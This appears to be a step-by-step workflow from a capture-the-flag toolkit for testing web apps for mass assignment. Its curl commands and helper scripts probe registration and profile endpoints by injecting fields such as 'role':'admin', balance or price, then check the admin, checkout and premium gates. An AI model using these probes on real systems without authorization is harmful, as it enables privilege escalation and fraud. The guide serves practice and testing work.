# Workflow — the mass-assignment engagement, step by step

## Phase 0 — recon

```bash
python3 tools/state.py <name> --category web --target <url> \
  --challenge-name "<real>" --event "<event>"
python3 tools/classify.py "<obs>"
python3 tools/web/bundle_miner.py --url <bundle-url> --out /tmp/bundle
```

Deliverables: the endpoint list (every body-accepting route) and the
field map (every model field from GETs, bundle, errors, docs).

## Phase 1 — the field inventory

```bash
curl -s -b "$JAR" "$BASE/api/me" | jq .
```

Every key the response returns and the form doesn't send is a probe.
Priorities: `role`/`isAdmin`/`permissions`/`groups` (privilege),
`verified`/`approved`/`active` (gates), `balance`/`price`/`discount`/
`total` (economics), `plan`/`tier` (entitlement).

## Phase 2 — the control/canary pair

```bash
# control — the documented body
curl -i -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"c1","password":"x"}' > ctrl.txt

# canary — same + ONE field
curl -i -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"n1","password":"x","role":"admin"}' > canary.txt

# read-back — DIFFERENT endpoint
curl -i "$BASE/api/users/n1" > readback.txt
```

Or the tool:

```bash
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"
```

## Phase 3 — read the result

| Read-back | Verdict | Next |
|---|---|---|
| `role:"admin"` | stored → leg 4 | exercise the decision |
| `role:"user"` | allowlist falsifier | nested → content-type → `PATCH` → done |
| `400 unknown property` | schema falsifier | form/multipart → `PATCH` → done |
| `role` absent | serializer hid it | second representation / exercise directly |

## Phase 4 — the decision exercise

```bash
curl -i -b "$JAR" "$BASE/admin"        # role gate
curl -i -b "$JAR" -X POST "$BASE/checkout"   # price/discount gate
curl -i -b "$JAR" "$BASE/premium"      # verified/plan gate
```

Stored + decision-changed = confirmed at impact. Stored + inert = null
result — the gate reads a different field; find WHICH from admin-record
diffs or the gate's code.

## Phase 5 — widen or stop

The falsifier depth decides:

- content-type falsifier → try form/multipart (one probe each);
- endpoint falsifier → try `PATCH`/nested/prefixed (one probe each);
- model falsifier → class dead; `decide.py` for the next class.

Five probes per mechanism cell; a falsifier closes the cell.

## Phase 6 — record

```bash
python3 tools/hooks.py post-probe <ch> \
  --request "POST /register role=admin" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat readback.txt)"
```

Then the flag through `pre-flag` against its live response, and
`classify_solve.py --chain <id>` files the solve — which PROMOTES this
class from catalogue to verified.
